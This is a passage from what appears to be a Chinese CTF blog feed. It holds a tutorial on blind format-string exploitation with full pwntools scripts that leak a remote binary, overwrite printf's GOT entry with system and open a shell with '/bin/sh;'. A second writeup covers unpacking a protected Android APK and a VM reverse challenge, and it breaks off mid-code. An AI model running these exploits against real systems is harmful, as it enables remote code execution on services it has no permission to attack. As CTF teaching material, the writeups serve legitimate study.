class="line"><span class="meta">aaaaaaaa%</span><span class="bash">p%p%p%p%p%p%p%p%p</span></span><br><span class="line">aaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025</span><br></pre></td></tr></table></figure><p>据此，我们可以知道格式化字符串的起始地址偏移为 6。</p><h4 id="泄露-binary"><a href="#泄露-binary" class="headerlink" title="泄露 binary"></a>泄露 binary</h4><p>由于程序是 64 位，所以我们从 0x400000 处开始泄露。一般来说有格式化字符串漏洞的盲打都是可以读入 ‘\x00’ 字符的，不然没法泄露怎么玩，，除此之后，输出必然是 ‘\x00’ 截断的，这是因为格式化字符串漏洞利用的输出函数均是 ‘\x00’ 截断的，所以我们可以利用如下的泄露代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">##context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="comment"># leak addr for three times</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            sh = remote(ip, port)</span><br><span class="line">            payload = <span class="string">&#x27;%00008$s&#x27;</span> + <span class="string">&#x27;STARTEND&#x27;</span> + p64(addr)</span><br><span class="line">            <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            data = sh.recvuntil(<span class="string">&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbinary</span>():</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        data = leak(addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    f.close()</span><br><span class="line">getbinary()</span><br></pre></td></tr></table></figure><p>需要注意的是，在 payload 中需要判断是否有 ‘\n’ 出现，因为这样会导致源程序只读取前面的内容，而没有办法泄露内存，所以需要跳过这样的地址。</p><h4 id="分析-binary"><a href="#分析-binary" class="headerlink" title="分析 binary"></a>分析 binary</h4><p>利用 IDA 打开泄露的 binary ，改变程序基地址，然后简单看看，可以基本确定源程序 main 函数的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seg000:00000000004005F6                 push    rbp</span><br><span class="line">seg000:00000000004005F7                 mov     rbp, rsp</span><br><span class="line">seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">seg000:00000000004005FE</span><br><span class="line">seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639j</span><br><span class="line">seg000:00000000004005FE                 lea     rax, [rbp-80h]</span><br><span class="line">seg000:0000000000400602                 mov     edx, 80h ; &#x27;€&#x27;</span><br><span class="line">seg000:0000000000400607                 mov     rsi, rax</span><br><span class="line">seg000:000000000040060A                 mov     edi, 0</span><br><span class="line">seg000:000000000040060F                 mov     eax, 0</span><br><span class="line">seg000:0000000000400614                 call    sub_4004C0</span><br><span class="line">seg000:0000000000400619                 lea     rax, [rbp-80h]</span><br><span class="line">seg000:000000000040061D                 mov     rdi, rax</span><br><span class="line">seg000:0000000000400620                 mov     eax, 0</span><br><span class="line">seg000:0000000000400625                 call    sub_4004B0</span><br><span class="line">seg000:000000000040062A                 mov     rax, cs:601048h</span><br><span class="line">seg000:0000000000400631                 mov     rdi, rax</span><br><span class="line">seg000:0000000000400634                 call    near ptr unk_4004E0</span><br><span class="line">seg000:0000000000400639                 jmp     short loc_4005FE</span><br></pre></td></tr></table></figure><p>可以基本确定的是 sub_4004C0 为 read 函数，因为读入函数一共有三个参数的话，基本就是 read 了。此外，下面调用的 sub_4004B0 应该就是输出函数了，再之后应该又调用了一个函数，此后又重新跳到读入函数处，那程序应该是一个 while 1 的循环，一直在执行。</p><p><strong>注解：</strong>补充一张图</p><p><img src="_images/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/fmrstr_6.png" alt="fmrstr_6"></p><h4 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h4><p>分析完上面的之后，我们可以确定如下基本思路</p><ul><li>泄露 printf 函数的地址，</li><li>获取对应 libc 以及 system 函数地址</li><li>修改 printf 地址为 system 函数地址</li><li>读入 /bin/sh; 以便于获取 shell</li></ul><h4 id="利用程序-3"><a href="#利用程序-3" class="headerlink" title="利用程序"></a>利用程序</h4><p>程序如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##coding=utf8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">##context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="comment"># leak addr for three times</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            sh = remote(ip, port)</span><br><span class="line">            payload = <span class="string">&#x27;%00008$s&#x27;</span> + <span class="string">&#x27;STARTEND&#x27;</span> + p64(addr)</span><br><span class="line">            <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            data = sh.recvuntil(<span class="string">&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbinary</span>():</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        data = leak(addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##getbinary()</span></span><br><span class="line">read_got = <span class="number">0x601020</span></span><br><span class="line">printf_got = <span class="number">0x601018</span></span><br><span class="line">sh = remote(ip, port)</span><br><span class="line"><span class="comment">## let the read get resolved</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="comment">## get printf addr</span></span><br><span class="line">payload = <span class="string">&#x27;%00008$s&#x27;</span> + <span class="string">&#x27;STARTEND&#x27;</span> + p64(read_got)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(<span class="string">&#x27;STARTEND&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">read_addr = u64(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">## get system addr</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.success(<span class="string">&#x27;read   addr: &#x27;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line"><span class="comment">## modify printf_got</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printf_got: system_addr&#125;, <span class="number">0</span>, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment">## get all the addr</span></span><br><span class="line">addr = payload[:<span class="number">32</span>]</span><br><span class="line">payload = <span class="string">&#x27;%32d&#x27;</span> + payload[<span class="number">32</span>:]</span><br><span class="line">offset = (<span class="built_in">int</span>)(math.ceil(<span class="built_in">len</span>(payload) / <span class="number">8.0</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">10</span>):</span><br><span class="line">    old = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    new = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(offset + i)</span><br><span class="line">    payload = payload.replace(old, new)</span><br><span class="line">remainer = <span class="built_in">len</span>(payload) % <span class="number">8</span></span><br><span class="line">payload += (<span class="number">8</span> - remainer) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += addr</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment">## get shell</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh;&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里需要注意的是这一段代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## modify printf_got</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printf_got: system_addr&#125;, <span class="number">0</span>, write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment">## get all the addr</span></span><br><span class="line">addr = payload[:<span class="number">32</span>]</span><br><span class="line">payload = <span class="string">&#x27;%32d&#x27;</span> + payload[<span class="number">32</span>:]</span><br><span class="line">offset = (<span class="built_in">int</span>)(math.ceil(<span class="built_in">len</span>(payload) / <span class="number">8.0</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">10</span>):</span><br><span class="line">    old = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    new = <span class="string">&#x27;%&#123;&#125;$&#x27;</span>.<span class="built_in">format</span>(offset + i)</span><br><span class="line">    payload = payload.replace(old, new)</span><br><span class="line">remainer = <span class="built_in">len</span>(payload) % <span class="number">8</span></span><br><span class="line">payload += (<span class="number">8</span> - remainer) * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += addr</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure><p>fmtstr_payload 直接得到的 payload 会将地址放在前面，而这个会导致 printf 的时候 ‘\x00’ 截断（<strong>关于这一问题，pwntools 目前正在开发 fmt_payload 的加强版，估计快开发出来了。</strong>）。所以我使用了一些技巧将它放在后面了。主要的思想是，将地址放在后面 8 字节对齐的地方，并对 payload 中的偏移进行修改。需要注意的是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">offset = (int)(math.ceil(len(payload) / 8.0) + 1)</span><br></pre></td></tr></table></figure><p>这一行给出了修改后的地址在格式化字符串中的偏移，之所以是这样在于无论如何修改，由于 ‘%order$hn’ 中 order 多出来的字符都不会大于 8。具体的可以自行推导。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><ul><li>SuCTF2018 - lock2 （主办方提供了 docker 镜像: suctf/2018-pwn-lock2）</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 格式化字符 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届网鼎杯青龙组部分题目Writeup</title>
      <link href="archives/973b495c/"/>
      <url>archives/973b495c/</url>
      
        <content type="html"><![CDATA[<h2 id="Reverse-bang"><a href="#Reverse-bang" class="headerlink" title="Reverse bang"></a>Reverse bang</h2><p><strong>考点：梆梆加固脱壳</strong></p><h3 id="加固特征分析"><a href="#加固特征分析" class="headerlink" title="加固特征分析"></a>加固特征分析</h3><p>apktools 加载工程后，部分文件丢失（灰色）。smail 代码只有 SecShell 类；lib 中发现 libSecShell.so ，结合<a href="https://blog.csdn.net/g5703129/article/details/85054405">最新各大apk加固特征库</a>和吾爱帖子推测应该是<strong>梆梆加固免费版</strong>。</p><p>梆梆加固会隐藏源码，然后在 com 中加载 libSecShell.so ，来运行程序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;SecShell&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="程序脱壳"><a href="#程序脱壳" class="headerlink" title="程序脱壳"></a>程序脱壳</h3><blockquote><p> 脱壳过程一直踩坑，各种环境问题而出错。</p><p>准备使用<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>来脱壳的，但是 AS ADV arm架构机器一直报错运行不起来。<a href="https://www.mrskye.cn/archives/123/">失败记录独立成篇</a>，跪求大佬指导。</p></blockquote><p>选择使用 xposed + <a href="https://github.com/OakChen/ApkShelling">apkshelling</a> 模块脱壳，脱壳原理移步作者 github 。</p><h4 id="编译apkshelling"><a href="#编译apkshelling" class="headerlink" title="编译apkshelling"></a>编译apkshelling</h4><p>apkshelling 会匹配是否目标包名及是否加壳，是的话就脱壳。但稳妥起见将目标 apk 的包名填入到 apkshelling 源码中的 XposedEntry 。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-yeJ92tvgzwmWc418.png"></p><p>编译生成 apk ，安装到虚拟器中，在 xpoesed 中激活启用，重启虚拟机。</p><p>apk 源码中有 activity 需要编译成无桌面图标的。如果要编译无桌面图标 apk 看这里：</p><p>[collapse title=”展开查看详情” status=”false”]</p><p>launch 选择 Nothing。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-SIncXxjJrmM0do4M.png"></p><p>或者需注释掉xml 里面的 APP 入口Activity中的下面这句即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>[/collapse]</p><h4 id="dump-dex"><a href="#dump-dex" class="headerlink" title="dump dex"></a>dump dex</h4><p>重启后安装&amp;运行题目的 apk。查看 xpoesed 日志看看有没有 dump 到dex ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat -s Xposed</span><br></pre></td></tr></table></figure><p>成功 dump 会有类似 log ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I/Xposed  ( 2450): Load package: com.example.how_debug</span><br><span class="line">I/Xposed  ( 2450): Found com.SecShell.SecShell.ApplicationWrapper</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-01.dex</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-02.dex</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-03.dex</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-04.dex</span><br></pre></td></tr></table></figure><p>dex 会被 dump 到<code>/data/data/包名</code>。</p><h4 id="逆向找flag"><a href="#逆向找flag" class="headerlink" title="逆向找flag"></a><del>逆向</del>找flag</h4><p>把 dex 拖到本机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/com.example.how_debug/00081-02.dex ./</span><br></pre></td></tr></table></figure><p>dump 出来的 dex 文件，使用 jeb 打开，也可以选择 jadx 。</p><p>dump 出来的 4 个 dex 只有一个是程序源码，挨个找一下（com.example.how_debug）就行。</p><p>打开后就能找到 flag ：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-zWUkxSjcY9WSMDqi.png"></p><h3 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h3><p>搜罗一下发现 <a href="https://github.com/hanbinglengyue/FART">FART</a> 好像也可以脱这个壳，但相比于 <a href="https://github.com/OakChen/ApkShelling">apkshelling</a> 能力比较弱，具体对比&amp;安装&amp;使用，看这里：<a href="https://www.jianshu.com/p/ed64212ccd38">ApkShelling脱壳和FART脱壳</a>。</p><p>实在太菜 <a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a> 环境部署不来。</p><h2 id="Reverse-signal"><a href="#Reverse-signal" class="headerlink" title="Reverse signal"></a>Reverse signal</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>程序要求输入一串字符，前面有一个校验长度是否为 15 。检验通过后会进入下面这个伪虚拟机的加密函数里面。操作的指令存放在 a1 ，加密的 flag 也在 a1 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">100</span>]; <span class="comment">// [esp+13h] [ebp-E5h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+77h] [ebp-81h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v10;</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v10] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v4[v7] = v5;</span><br><span class="line">        ++v10;</span><br><span class="line">        ++v7;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v5 = a1[v10 + <span class="number">1</span>] + v3[v9];</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v5 = v3[v9] - LOBYTE(a1[v10 + <span class="number">1</span>]);</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = a1[v10 + <span class="number">1</span>] ^ v3[v9];</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v5 = a1[v10 + <span class="number">1</span>] * v3[v9];</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v4[v8] != a1[v10 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v8;</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v3[v6] = 